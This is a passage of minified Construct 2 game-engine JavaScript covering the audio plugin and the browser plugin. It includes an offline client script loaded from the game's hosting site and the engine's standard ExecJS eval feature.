st(v[0],v[1]))}for(s=0,n=w.length;s<n;s++)3!==this.saveload&&(o=(r=w[s]).buffersrc,a=r.is_music,h=r.tag,c=r.playbackTime,l=r.looping,u=r.volume,m=(f=r.pan)&&f.hasOwnProperty("objUid")?f.objUid:-1,a&&1===this.saveload||!a&&2===this.saveload||((d=this.getAudioInstance(o,h,a,l,u))?(d.resume_position=r.resume_position,d.setPannerEnabled(!!f),d.play(l,u,c),d.updatePlaybackRate(),d.updateVolume(),d.doSetMuted(d.is_muted||d.is_silent),r.paused&&d.pause(),r.muted&&d.setMuted(!0),d.doSetMuted(d.is_muted||d.is_silent),f&&(-1!==m?(d.objectTracker=d.objectTracker||new nt,d.objectTracker.loadUid=m,ht.push(d.objectTracker)):d.setPan(f.x,f.y,f.a,f.ia,f.oa,f.og))):((p=this.getAudioBuffer(o,a)).seekWhenReady=c,p.pauseWhenReady=r.paused,f&&(-1!==m?p.panWhenReady.push({objUid:m,ia:f.ia,oa:f.oa,og:f.og,thistag:h}):p.panWhenReady.push({x:f.x,y:f.y,a:f.a,ia:f.ia,oa:f.oa,og:f.og,thistag:h})))));if(e&&!S){for(s=0,n=x.length;s<n;s++)x[s].setSilent(!0);S=!0}else if(!e&&S){for(s=0,n=x.length;s<n;s++)x[s].setSilent(!1);S=!1}},at.afterLoad=function(){for(var t,e,i=0,s=ht.length;i<s;i++)t=ht[i],e=this.runtime.getObjectByUID(t.loadUid),t.setObject(e),t.loadUid=-1,e&&(_=e.x,v=e.y);cr.clearArray(ht)},at.onSuspend=function(t){if(!this.playinbackground){var e,i;for(!t&&d&&d.resume&&(d.resume(),b=!1),e=0,i=x.length;e<i;e++)x[e].setSuspended(t);t&&d&&d.suspend&&(d.suspend(),b=!0)}},at.tick=function(){for(var t,e,i,s,n=this.runtime.dt,r=0,o=x.length;r<o;r++)(t=x[r]).tick(n),0!==y&&t.updatePlaybackRate();for(e in N)if(N.hasOwnProperty(e))for(r=0,o=(i=N[e]).length;r<o;r++)(s=i[r]).tick&&s.tick();p===h&&this.listenerTracker.hasObject()&&(this.listenerTracker.tick(n),_=this.listenerTracker.obj.x,v=this.listenerTracker.obj.y,d.listener.setPosition(this.listenerTracker.obj.x,this.listenerTracker.obj.y,this.listenerZ))};var ct=[];at.setPreloadList=function(t){for(var e,i,s,n=0,r=0,o=t.length;r<o;++r)e=(s=t[r])[0],i=2*s[1],((s=4<e.length&&".ogg"===e.substr(e.length-4))&&m||!s&&!m)&&(ct.push({filename:e,size:i,obj:null}),n+=i);return n},at.startPreloads=function(){for(var t,e,i=0,s=ct.length;i<s;++i)t=ct[i],e=this.runtime.files_subfolder+t.filename,t.obj=this.getAudioBuffer(e,!1)},at.getPreloadedSize=function(){for(var t,e=0,i=0,s=ct.length;i<s;++i)(t=ct[i]).obj.isLoadedAndDecoded()||t.obj.hasFailedToLoad()||this.runtime.isDomFree||this.runtime.isAndroidStockBrowser?e+=t.size:t.obj.isLoaded()&&(e+=Math.floor(t.size/2));return e},at.releaseAllMusicBuffers=function(){for(var t,e=0,i=0,s=g.length;e<s;++e)t=g[e],(g[i]=t).is_music?t.release():++i;g.length=i},at.getAudioBuffer=function(t,e,i){for(var s,n=null,r=0,o=g.length;r<o;r++)if((s=g[r]).src===t){n=s;break}return n||i||(M&&e&&this.releaseAllMusicBuffers(),n=new rt(t,e),g.push(n)),n},at.getAudioInstance=function(t,e,i,s,n){for(var r,o=0,a=x.length;o<a;o++)if((r=x[o]).src===t&&(r.canBeRecycled()||i))return r.tag=e,r;var h=this.getAudioBuffer(t,i);return h.bufferObject?(r=new ot(h,e),x.push(r),r):("<preload>"!==e&&(h.playTagWhenReady=e,h.loopWhenReady=s,h.volumeWhenReady=n),null)};var lt=[];function ut(t,e){t=t.isPlaying()?1:0,e=e.isPlaying()?1:0;return t==e?0:t<e?1:-1}function pt(t,e){if(cr.clearArray(lt),!t.length)return f&&!f.hasEnded()&&(cr.clearArray(lt),void(lt[0]=f));for(var i,s=0,n=x.length;s<n;s++)i=x[s],cr.equals_nocase(t,i.tag)&&lt.push(i);e&&lt.sort(ut)}function dt(t){var e,i,s,n,r=d.destination;if(N.hasOwnProperty(t)&&(s=N[t]).length)for(r=s[0].getInputNode(),e=0,i=s.length;e<i;e++)n=s[e],e+1===i?n.connectTo(d.destination):n.connectTo(s[e+1].getInputNode());for(pt(t),e=0,i=lt.length;e<i;e++)lt[e].reconnect(r);A&&E===t&&(A.disconnect(),A.connect(r))}function gt(t,e){N.hasOwnProperty(t)?N[t].push(e):N[t]=[e],dt(t)}function ft(){}function mt(){}function yt(){}function _t(t,e){var i=null;return N.hasOwnProperty(t)&&(i=N[t]),i&&0<=e&&e<i.length&&i[e].freqBins?i[e]:null}ft.prototype.OnEnded=function(t){return cr.equals_nocase(r,t)},ft.prototype.PreloadsComplete=function(){for(var t=0,e=g.length;t<e;t++)if(!g[t].isLoadedAndDecoded()&&!g[t].hasFailedToLoad())return!1;return!0},ft.prototype.AdvancedAudioSupported=function(){return p===h},ft.prototype.IsSilent=function(){return S},ft.prototype.IsAnyPlaying=function(){for(var t=0,e=x.length;t<e;t++)if(x[t].isPlaying())return!0;return!1},ft.prototype.IsTagPlaying=function(t){var e,i;for(pt(t),e=0,i=lt.length;e<i;e++)if(lt[e].isPlaying())return!0;return!1},t.cnds=new ft,mt.prototype.Play=function(t,e,i,s){var n;S||(n=R(i),i=t[1],t=this.runtime.files_subfolder+t[0]+(m?".ogg":".m4a"),(f=this.getAudioInstance(t,s,i,0!==e,n))&&(f.setPannerEnabled(!1),f.play(0!==e,n,0,this.nextPlayTime),this.nextPlayTime=0))},mt.prototype.PlayAtPosition=function(t,e,i,s,n,r,o,a,h,c){var l;S||(l=R(i),i=t[1],t=this.runtime.files_subfolder+t[0]+(m?".ogg":".m4a"),(f=this.getAudioInstance(t,c,i,0!==e,l))?(f.setPannerEnabled(!0),f.setPan(s,n,r,o,a,R(h)),f.play(0!==e,l,0,this.nextPlayTime),this.nextPlayTime=0):this.getAudioBuffer(t,i).panWhenReady.push({x:s,y:n,a:r,ia:o,oa:a,og:R(h),thistag:c}))},mt.prototype.PlayAtObject=function(t,e,i,s,n,r,o,a){var h,c,l;S||!s||(h=s.getFirstPicked())&&(c=R(i),l=t[1],s=this.runtime.files_subfolder+t[0]+(m?".ogg":".m4a"),(f=this.getAudioInstance(s,a,l,0!==e,c))?(f.setPannerEnabled(!0),i=cr.rotatePtAround(h.x,h.y,-h.layer.getAngle(),_,v,!0),t=cr.rotatePtAround(h.x,h.y,-h.layer.getAngle(),_,v,!1),f.setPan(i,t,cr.to_degrees(h.angle-h.layer.getAngle()),n,r,R(o)),f.setObject(h),f.play(0!==e,c,0,this.nextPlayTime),this.nextPlayTime=0):this.getAudioBuffer(s,l).panWhenReady.push({obj:h,ia:n,oa:r,og:R(o),thistag:a}))},mt.prototype.PlayByName=function(t,e,i,s,n){S||(s=R(s),t=1===t,e=this.runtime.files_subfolder+e.toLowerCase()+(m?".ogg":".m4a"),(f=this.getAudioInstance(e,n,t,0!==i,s))&&(f.setPannerEnabled(!1),f.play(0!==i,s,0,this.nextPlayTime),this.nextPlayTime=0))},mt.prototype.PlayAtPositionByName=function(t,e,i,s,n,r,o,a,h,c,l){S||(s=R(s),t=1===t,e=this.runtime.files_subfolder+e.toLowerCase()+(m?".ogg":".m4a"),(f=this.getAudioInstance(e,l,t,0!==i,s))?(f.setPannerEnabled(!0),f.setPan(n,r,o,a,h,R(c)),f.play(0!==i,s,0,this.nextPlayTime),this.nextPlayTime=0):this.getAudioBuffer(e,t).panWhenReady.push({x:n,y:r,a:o,ia:a,oa:h,og:R(c),thistag:l}))},mt.prototype.PlayAtObjectByName=function(t,e,i,s,n,r,o,a,h){var c,l;S||!n||(c=n.getFirstPicked())&&(l=R(s),n=1===t,s=this.runtime.files_subfolder+e.toLowerCase()+(m?".ogg":".m4a"),(f=this.getAudioInstance(s,h,n,0!==i,l))?(f.setPannerEnabled(!0),t=cr.rotatePtAround(c.x,c.y,-c.layer.getAngle(),_,v,!0),e=cr.rotatePtAround(c.x,c.y,-c.layer.getAngle(),_,v,!1),f.setPan(t,e,cr.to_degrees(c.angle-c.layer.getAngle()),r,o,R(a)),f.setObject(c),f.play(0!==i,l,0,this.nextPlayTime),this.nextPlayTime=0):this.getAudioBuffer(s,n).panWhenReady.push({obj:c,ia:r,oa:o,og:R(a),thistag:h}))},mt.prototype.SetLooping=function(t,e){var i,s;for(pt(t),i=0,s=lt.length;i<s;i++)lt[i].setLooping(0===e)},mt.prototype.SetMuted=function(t,e){var i,s;for(pt(t),i=0,s=lt.length;i<s;i++)lt[i].setMuted(0===e)},mt.prototype.SetVolume=function(t,e){pt(t);for(var i=R(e),s=0,n=lt.length;s<n;s++)lt[s].setVolume(i)},mt.prototype.Preload=function(t){var e;S||(e=t[1],t=this.runtime.files_subfolder+t[0]+(m?".ogg":".m4a"),p!==u?p!==l&&this.getAudioInstance(t,"<preload>",e,!1):(this.runtime.isDirectCanvas?AppMobi.context:AppMobi.player).loadSound(t))},mt.prototype.PreloadByName=function(t,e){S||(t=1===t,e=this.runtime.files_subfolder+e.toLowerCase()+(m?".ogg":".m4a"),p!==u?p!==l&&this.getAudioInstance(e,"<preload>",t,!1):(this.runtime.isDirectCanvas?AppMobi.context:AppMobi.player).loadSound(e))},mt.prototype.SetPlaybackRate=function(t,e){var i,s;for(pt(t),e<0&&(e=0),i=0,s=lt.length;i<s;i++)lt[i].setPlaybackRate(e)},mt.prototype.Stop=function(t){var e,i;for(pt(t),e=0,i=lt.length;e<i;e++)lt[e].stop()},mt.prototype.StopAll=function(){for(var t=0,e=x.length;t<e;t++)x[t].stop()},mt.prototype.SetPaused=function(t,e){var i,s;for(pt(t),i=0,s=lt.length;i<s;i++)0===e?lt[i].pause():lt[i].resume()},mt.prototype.Seek=function(t,e){var i,s;for(pt(t),i=0,s=lt.length;i<s;i++)lt[i].seek(e)},mt.prototype.SetSilent=function(t){var e,i;if(2===t&&(t=S?1:0),0!==t||S){if(1===t&&S){for(e=0,i=x.length;e<i;e++)x[e].setSilent(!1);S=!1}}else{for(e=0,i=x.length;e<i;e++)x[e].setSilent(!0);S=!0}},mt.prototype.SetMasterVolume=function(t){var e,i;for(T=R(t),e=0,i=x.length;e<i;e++)x[e].updateVolume()},mt.prototype.AddFilterEffect=function(t,e,i,s,n,r,o){p!==h||e<0||Y.length<=e||!d.createBiquadFilter||((o/=100)<0&&(o=0),1<o&&(o=1),gt(t=t.toLowerCase(),new J(e,i,s,n,r,o)))},mt.prototype.AddDelayEffect=function(t,e,i,s){p===h&&((s/=100)<0&&(s=0),1<s&&(s=1),gt(t=t.toLowerCase(),new H(e,R(i),s)))},mt.prototype.AddFlangerEffect=function(t,e,i,s,n,r){p===h&&d.createOscillator&&((r/=100)<0&&(r=0),1<r&&(r=1),gt(t=t.toLowerCase(),new K(e/1e3,i/1e3,s,n/100,r)))},mt.prototype.AddPhaserEffect=function(t,e,i,s,n,r,o){p===h&&d.createOscillator&&((o/=100)<0&&(o=0),1<o&&(o=1),gt(t=t.toLowerCase(),new Q(e,i,s,n,r,o)))},mt.prototype.AddConvolutionEffect=function(t,e,i,s){var n,r;p===h&&d.createConvolver&&(n=0===i,i=this.runtime.files_subfolder+e[0]+(m?".ogg":".m4a"),e=this.getAudioBuffer(i,!1),t=t.toLowerCase(),(s/=100)<0&&(s=0),1<s&&(s=1),e.bufferObject?r=new q(e.bufferObject,n,s,i):(r=new q(null,n,s,i),e.normalizeWhenReady=n,e.convolveWhenReady=r),gt(t,r))},mt.prototype.AddGainEffect=function(t,e){p===h&&gt(t=t.toLowerCase(),new Z(R(e)))},mt.prototype.AddMuteEffect=function(t){p===h&&gt(t=t.toLowerCase(),new Z(0))},mt.prototype.AddTremoloEffect=function(t,e,i){p===h&&d.createOscillator&&((i/=100)<0&&(i=0),1<i&&(i=1),gt(t=t.toLowerCase(),new $(e,i)))},mt.prototype.AddRingModEffect=function(t,e,i){p===h&&d.createOscillator&&((i/=100)<0&&(i=0),1<i&&(i=1),gt(t=t.toLowerCase(),new tt(e,i)))},mt.prototype.AddDistortionEffect=function(t,e,i,s,n,r){p===h&&d.createWaveShaper&&((r/=100)<0&&(r=0),1<r&&(r=1),gt(t=t.toLowerCase(),new et(e,i,s,n,r)))},mt.prototype.AddCompressorEffect=function(t,e,i,s,n,r){p===h&&d.createDynamicsCompressor&&gt(t=t.toLowerCase(),new it(e,i,s,n/1e3,r/1e3))},mt.prototype.AddAnalyserEffect=function(t,e,i){p===h&&gt(t=t.toLowerCase(),new st(e,i))},mt.prototype.RemoveEffects=function(t){var e,i,s;if(p===h&&(t=t.toLowerCase(),N.hasOwnProperty(t)&&(s=N[t]).length)){for(e=0,i=s.length;e<i;e++)s[e].remove();cr.clearArray(s),dt(t)}},mt.prototype.SetEffectParameter=function(t,e,i,s,n,r){p===h&&(t=t.toLowerCase(),e=Math.floor(e),N.hasOwnProperty(t)&&(t=N[t],e<0||e>=t.length||t[e].setParam(i,s,n,r)))},mt.prototype.SetListenerObject=function(t){!t||p!==h||(t=t.getFirstPicked())&&(this.listenerTracker.setObject(t),_=t.x,v=t.y)},mt.prototype.SetListenerZ=function(t){this.listenerZ=t},mt.prototype.ScheduleNextPlay=function(t){d&&(this.nextPlayTime=t)},mt.prototype.UnloadAudio=function(t){var e=t[1],t=this.runtime.files_subfolder+t[0]+(m?".ogg":".m4a"),e=this.getAudioBuffer(t,e,!0);e&&(e.release(),cr.arrayFindRemove(g,e))},mt.prototype.UnloadAudioByName=function(t,e){t=1===t,e=this.runtime.files_subfolder+e.toLowerCase()+(m?".ogg":".m4a"),t=this.getAudioBuffer(e,t,!0);t&&(t.release(),cr.arrayFindRemove(g,t))},mt.prototype.UnloadAll=function(){for(var t=0,e=g.length;t<e;++t)g[t].release();cr.clearArray(g)},t.acts=new mt,yt.prototype.Duration=function(t,e){pt(e,!0),lt.length?t.set_float(lt[0].getDuration()):t.set_float(0)},yt.prototype.PlaybackTime=function(t,e){pt(e,!0),lt.length?t.set_float(lt[0].getPlaybackTime(!0)):t.set_float(0)},yt.prototype.Volume=function(t,e){pt(e,!0),lt.length?(e=lt[0].getVolume(),t.set_float(j(e))):t.set_float(0)},yt.prototype.MasterVolume=function(t){t.set_float(j(T))},yt.prototype.EffectCount=function(t,e){e=e.toLowerCase();var i=null;N.hasOwnProperty(e)&&(i=N[e]),t.set_int(i?i.length:0)},yt.prototype.AnalyserFreqBinCount=function(t,e,i){i=_t(e=e.toLowerCase(),i=Math.floor(i));t.set_int(i?i.node.frequencyBinCount:0)},yt.prototype.AnalyserFreqBinAt=function(t,e,i,s){e=e.toLowerCase(),i=Math.floor(i),s=Math.floor(s);i=_t(e,i);!i||s<0||s>=i.node.frequencyBinCount?t.set_float(0):t.set_float(i.freqBins[s])},yt.prototype.AnalyserPeakLevel=function(t,e,i){i=_t(e=e.toLowerCase(),i=Math.floor(i));i?t.set_float(i.peak):t.set_float(0)},yt.prototype.AnalyserRMSLevel=function(t,e,i){i=_t(e=e.toLowerCase(),i=Math.floor(i));i?t.set_float(i.rms):t.set_float(0)},yt.prototype.SampleRate=function(t){t.set_int(d?d.sampleRate:0)},yt.prototype.CurrentTime=function(t){t.set_float(d?d.currentTime:cr.performance_now())},t.exps=new yt}(),cr.plugins_.Browser=function(t){this.runtime=t},function(){var pluginProto=cr.plugins_.Browser.prototype;pluginProto.Type=function(t){this.plugin=t,this.runtime=t.runtime};var typeProto=pluginProto.Type.prototype;typeProto.onCreate=function(){};var offlineScriptReady=!1,browserPluginReady=!1;document.addEventListener("DOMContentLoaded",function(){var t;window.C2_RegisterSW&&navigator.serviceWorker&&((t=document.createElement("script")).onload=function(){offlineScriptReady=!0,checkReady()},t.src="https://427396048-642845047394716217.preview.editmysite.com/uploads/b/139890129-761103484729797659/files/offlineClient.js",document.head.appendChild(t))});var browserInstance=null;function checkReady(){offlineScriptReady&&browserPluginReady&&window.OfflineClientInfo&&window.OfflineClientInfo.SetMessageCallback(function(t){browserInstance.onSWMessage(t)})}typeProto.onAppBegin=function(){browserPluginReady=!0,checkReady()},pluginProto.Instance=function(t){this.type=t,this.runtime=t.runtime};var instanceProto=pluginProto.Instance.prototype;instanceProto.onCreate=function(){var e=this;window.addEventListener("resize",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnResize,e)}),browserInstance=this,void 0!==navigator.onLine&&(window.addEventListener("online",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnOnline,e)}),window.addEventListener("offline",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnOffline,e)})),this.runtime.isDirectCanvas||(document.addEventListener("appMobi.device.update.available",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateReady,e)}),document.addEventListener("backbutton",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton,e)}),document.addEventListener("menubutton",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnMenuButton,e)}),document.addEventListener("searchbutton",function(){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnSearchButton,e)}),document.addEventListener("tizenhwkey",function(t){switch(t.keyName){case"back":e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton,e)||window.tizen&&window.tizen.application.getCurrentApplication().exit();break;case"menu":e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnMenuButton,e)||t.preventDefault()}})),this.runtime.isWindows10&&"undefined"!=typeof Windows?Windows.UI.Core.SystemNavigationManager.getForCurrentView().addEventListener("backrequested",function(t){e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton,e)&&(t.handled=!0)}):this.runtime.isWinJS&&WinJS.Application&&(WinJS.Application.onbackclick=function(t){return!!e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnBackButton,e)}),this.runtime.addSuspendCallback(function(t){t?e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnPageHidden,e):e.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnPageVisible,e)}),this.is_arcade=void 0!==window.is_scirra_arcade},instanceProto.onSWMessage=function(t){t=t.data.type;"downloading-update"===t?this.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateFound,this):"update-ready"===t||"update-pending"===t?this.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnUpdateReady,this):"offline-ready"===t&&this.runtime.trigger(cr.plugins_.Browser.prototype.cnds.OnOfflineReady,this)};var batteryManager=null,loadedBatteryManager=!1;function maybeLoadBatteryManager(){var t;loadedBatteryManager||navigator.getBattery&&(t=navigator.getBattery(),loadedBatteryManager=!0,t&&t.then(function(t){batteryManager=t}))}function Cnds(){}function Acts(){}Cnds.prototype.CookiesEnabled=function(){return!!navigator&&navigator.cookieEnabled},Cnds.prototype.IsOnline=function(){return!!navigator&&navigator.onLine},Cnds.prototype.HasJava=function(){return!!navigator&&navigator.javaEnabled()},Cnds.prototype.OnOnline=function(){return!0},Cnds.prototype.OnOffline=function(){return!0},Cnds.prototype.IsDownloadingUpdate=function(){return!1},Cnds.prototype.OnUpdateReady=function(){return!0},Cnds.prototype.PageVisible=function(){return!this.runtime.isSuspended},Cnds.prototype.OnPageVisible=function(){return!0},Cnds.prototype.OnPageHidden=function(){return!0},Cnds.prototype.OnResize=function(){return!0},Cnds.prototype.IsFullscreen=function(){return!!(document.mozFullScreen||document.webkitIsFullScreen||document.fullScreen||this.runtime.isNodeFullscreen)},Cnds.prototype.OnBackButton=function(){return!0},Cnds.prototype.OnMenuButton=function(){return!0},Cnds.prototype.OnSearchButton=function(){return!0},Cnds.prototype.IsMetered=function(){var t=navigator.connection||navigator.mozConnection||navigator.webkitConnection;return!!t&&!!t.metered},Cnds.prototype.IsCharging=function(){var t=navigator.battery||navigator.mozBattery||navigator.webkitBattery;return t?!!t.charging:(maybeLoadBatteryManager(),!batteryManager||!!batteryManager.charging)},Cnds.prototype.IsPortraitLandscape=function(t){return(window.innerWidth<=window.innerHeight?0:1)===t},Cnds.prototype.SupportsFullscreen=function(){if(this.runtime.isNodeWebkit)return!0;var t=this.runtime.canvasdiv||this.runtime.canvas;return!!(t.requestFullscreen||t.mozRequestFullScreen||t.msRequestFullscreen||t.webkitRequestFullScreen)},Cnds.prototype.OnUpdateFound=function(){return!0},Cnds.prototype.OnUpdateReady=function(){return!0},Cnds.prototype.OnOfflineReady=function(){return!0},pluginProto.cnds=new Cnds,Acts.prototype.Alert=function(t){this.runtime.isDomFree||alert(t.toString())},Acts.prototype.Close=function(){this.runtime.isCocoonJs?CocoonJS.App.forceToFinish():window.tizen?window.tizen.application.getCurrentApplication().exit():navigator.app&&navigator.app.exitApp?navigator.app.exitApp():navigator.device&&navigator.device.exitApp?navigator.device.exitApp():this.is_arcade||this.runtime.isDomFree||window.close()},Acts.prototype.Focus=function(){this.runtime.isNodeWebkit?window.nwgui.Window.get().focus():this.is_arcade||this.runtime.isDomFree||window.focus()},Acts.prototype.Blur=function(){this.runtime.isNodeWebkit?window.nwgui.Window.get().blur():this.is_arcade||this.runtime.isDomFree||window.blur()},Acts.prototype.GoBack=function(){navigator.app&&navigator.app.backHistory?navigator.app.backHistory():this.is_arcade||this.runtime.isDomFree||!window.back||window.back()},Acts.prototype.GoForward=function(){this.is_arcade||this.runtime.isDomFree||!window.forward||window.forward()},Acts.prototype.GoHome=function(){this.is_arcade||this.runtime.isDomFree||!window.home||window.home()},Acts.prototype.GoToURL=function(t,e){this.runtime.isCocoonJs?CocoonJS.App.openURL(t):this.runtime.isEjecta?ejecta.openURL(t):this.runtime.isWinJS?Windows.System.Launcher.launchUriAsync(new Windows.Foundation.Uri(t)):navigator.app&&navigator.app.loadUrl?navigator.app.loadUrl(t,{openExternal:!0}):self.cordova&&self.cordova.InAppBrowser?self.cordova.InAppBrowser.open(t,"_system"):this.is_arcade||this.runtime.isDomFree||(2!==e||this.is_arcade?1!==e||this.is_arcade?window.location=t:window.parent.location=t:window.top.location=t)},Acts.prototype.GoToURLWindow=function(t,e){this.runtime.isCocoonJs?CocoonJS.App.openURL(t):this.runtime.isEjecta?ejecta.openURL(t):this.runtime.isWinJS?Windows.System.Launcher.launchUriAsync(new Windows.Foundation.Uri(t)):navigator.app&&navigator.app.loadUrl?navigator.app.loadUrl(t,{openExternal:!0}):self.cordova&&self.cordova.InAppBrowser?self.cordova.InAppBrowser.open(t,"_system"):this.is_arcade||this.runtime.isDomFree||window.open(t,e)},Acts.prototype.Reload=function(){this.is_arcade||this.runtime.isDomFree||window.location.reload()};var firstRequestFullscreen=!0,crruntime=null;function onFullscreenError(t){console&&console.warn&&console.warn("Fullscreen request failed: ",t),crruntime.setSize(window.innerWidth,window.innerHeight)}Acts.prototype.RequestFullScreen=function(t){this.runtime.isDomFree?cr.logexport("[Construct 2] Requesting fullscreen is not supported on this platform - the request has been ignored"):(2<=t&&(t+=1),6===t&&(t=2),this.runtime.isNodeWebkit?this.runtime.isDebug?debuggerFullscreen(!0):!this.runtime.isNodeFullscreen&&window.nwgui&&(window.nwgui.Window.get().enterFullscreen(),this.runtime.isNodeFullscreen=!0,this.runtime.fullscreen_scaling=2<=t?t:0):document.mozFullScreen||document.webkitIsFullScreen||document.msFullscreenElement||document.fullScreen||document.fullScreenElement||(this.runtime.fullscreen_scaling=2<=t?t:0,t=document.documentElement,firstRequestFullscreen&&(firstRequestFullscreen=!1,crruntime=this.runtime,t.addEventListener("mozfullscreenerror",onFullscreenError),t.addEventListener("webkitfullscreenerror",onFullscreenError),t.addEventListener("MSFullscreenError",onFullscreenError),t.addEventListener("fullscreenerror",onFullscreenError)),t.requestFullscreen?t.requestFullscreen():t.mozRequestFullScreen?t.mozRequestFullScreen():t.msRequestFullscreen?t.msRequestFullscreen():t.webkitRequestFullScreen&&("undefined"!=typeof Element&&void 0!==Element.ALLOW_KEYBOARD_INPUT?t.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):t.webkitRequestFullScreen())))},Acts.prototype.CancelFullScreen=function(){this.runtime.isDomFree?cr.logexport("[Construct 2] Exiting fullscreen is not supported on this platform - the request has been ignored"):this.runtime.isNodeWebkit?this.runtime.isDebug?debuggerFullscreen(!1):this.runtime.isNodeFullscreen&&window.nwgui&&(window.nwgui.Window.get().leaveFullscreen(),this.runtime.isNodeFullscreen=!1):document.exitFullscreen?document.exitFullscreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.msExitFullscreen?document.msExitFullscreen():document.webkitCancelFullScreen&&document.webkitCancelFullScreen()},Acts.prototype.Vibrate=function(t){try{for(var e=t.split(","),i=0,s=e.length;i<s;i++)e[i]=parseInt(e[i],10);navigator.vibrate?navigator.vibrate(e):navigator.mozVibrate?navigator.mozVibrate(e):navigator.webkitVibrate?navigator.webkitVibrate(e):navigator.msVibrate&&navigator.msVibrate(e)}catch(t){}},Acts.prototype.InvokeDownload=function(t,e){var i,s=document.createElement("a");void 0===s.download?window.open(t):(i=document.getElementsByTagName("body")[0],s.textContent=e,s.href=t,s.download=e,i.appendChild(s),e=new MouseEvent("click"),s.dispatchEvent(e),i.removeChild(s))},Acts.prototype.InvokeDownloadString=function(t,e,i){var s="data:"+e+","+encodeURIComponent(t),e=document.createElement("a");void 0===e.download?window.open(s):(t=document.getElementsByTagName("body")[0],e.textContent=i,e.href=s,e.download=i,t.appendChild(e),i=new MouseEvent("click"),e.dispatchEvent(i),t.removeChild(e))},Acts.prototype.ConsoleLog=function(t,e){"undefined"!=typeof console&&(0===t&&console.log&&console.log(e.toString()),1===t&&console.warn&&console.warn(e.toString()),2===t&&console.error&&console.error(e.toString()))},Acts.prototype.ConsoleGroup=function(t){console&&console.group&&console.group(t)},Acts.prototype.ConsoleGroupEnd=function(){console&&console.groupEnd&&console.groupEnd()},Acts.prototype.ExecJs=function(js_){try{eval&&eval(js_)}catch(e){console&&console.error&&console.error("Error executing Javascript: ",e)}};var orientations=["portrait","landscape","portrait-primary","portrait-secondary","landscape-primary","landscape-secondary"];function Exps(){}Acts.prototype.LockOrientation=function(t){(t=Math.floor(t))<0||t>=orientations.length||(this.runtime.autoLockOrientation=!1,t=orientations[t],screen.orientation&&screen.orientation.lock?screen.orientation.lock(t):screen.lockOrientation?screen.lockOrientation(t):screen.webkitLockOrientation?screen.webkitLockOrientation(t):screen.mozLockOrientation?screen.mozLockOrientation(t):screen.msLockOrientation&&screen.msLockOrientation(t))},Acts.prototype.UnlockOrientation=function(){this.runtime.autoLockOrientation=!1,screen.orientation&&screen.orientation.unlock?screen.orientation.unlock():screen.unlockOrientation?screen.unlockOrientation():screen.webkitUnlockOrientation?screen.webkitUnlockOrientation():screen.mozUnlockOrientation?screen.mozUnlockOrientation():screen.msUnlockOrientation&&screen.msUnlockOrientation()},pluginProto.acts=new Acts,Exps.prototype.URL=function(t){t.set_string(this.runtime.isDomFree?"":window.location.toString())},Exps.prototype.Protocol=function(t){t.set_string(this.runtime.isDomFree?"":window.location.protocol)},Exps.prototype.Domain=function(t){t.set_string(this.runtime.isDomFree?"":window.location.hostname)},Exps.prototype.PathName=function(t){t.set_string(this.runtime.isDomFree?"":window.location.pathname)},Exps.prototype.Hash=function(t){t.set_string(this.runtime.isDomFree?"":window.location.hash)},Exps.prototype.Referrer=function(t){t.set_string(this.runtime.isDomFree?"":document.referrer)},Exps.prototype.Title=function(t){t.set_string(this.runtime.isDomFree?"":document.title)},Exps.prototype.Name=function(t){t.set_string(this.runtime.isDomFree?"":navigator.appName)},Exps.prototype.Version=function(t){t.set_string(this.runtime.isDomFree?"":navigator.appVersion)},Exps.prototype.Language=function(t){navigator&&navigator.language?t.set_string(navigator.language):t.set_string("")},Exps.prototype.Platform=function(t){t.set_string(this.runtime.isDomFree?"":navigator.platform)},Exps.prototype.Product=function(t){navigator&&navigator.product?t.set_string(navigator.product):t.set_string("")},Exps.prototype.Vendor=function(t){navigator&&navigator.vendor?t.set_string(navigator.vendor):t.set_string("")},Exps.prototype.UserAgent=function(t){t.set_string(this.runtime.isDomFree?"":navigator.userAgent)},Exps.prototype.QueryString=function(t){t.set_string(this.runtime.isDomFree?"":window.location.search)},Exps.prototype.QueryParam=function(t,e){!this.runtime.isDomFree&&(e=RegExp("[?&]"+e+"=([^&]*)").exec(window.location.search))?t.set_string(decodeURIComponent(e[1].replace(/\+/g," "))):t.set_string("")},Exps.prototype.Bandwidth=function(t){var e=navigator.connection||navigator.mozConnection||navigator.webkitConnection;e?void 0!==e.bandwidth?t.set_float(e.bandwidth):void 0!==e.downlinkMax?t.set_float(e.downlinkMax):t.set_float(Number.POSITIVE_INFINITY):t.set_float(Number.POSITIVE_INFINITY)},Exps.prototype.ConnectionType=function(t){var e=navigator.connection||navigator.mozConnection||navigator.webkitConnection;e?t.set_string(e.type||"unknown"):t.set_string("unknown")},Exps.prototype.BatteryLevel=function(t){var e=navigator.battery||navigator.mozBattery||navigator.webkitBattery;e?t.set_float(e.level):(maybeLoadBatteryManager(),batteryManager?t.set_float(batteryManager.level):t.set_float(1))},Exps.prototype.BatteryTimeLeft=function(t){var e=navigator.battery||navigator.mozBattery||navigator.webkitBattery;e?t.set_float(e.dischargingTime):(maybeLoadBatteryManager(),batteryManager?t.set_float(batteryManager.dischargingTime):t.set_float(Number.POSITIVE_INFINITY))},Exps.prototype.ExecJS=function(ret,js_){if(eval){var result=0;try{result=eval(js_)}catch(e){console&&console.error&&console.error("Error executing Javascript: ",e)}"number"==typeof result||"string"==typeof result?ret.set_any(result):"boolean"==typeof result?ret.set_any(result?1:0):ret.set_any(0)}else 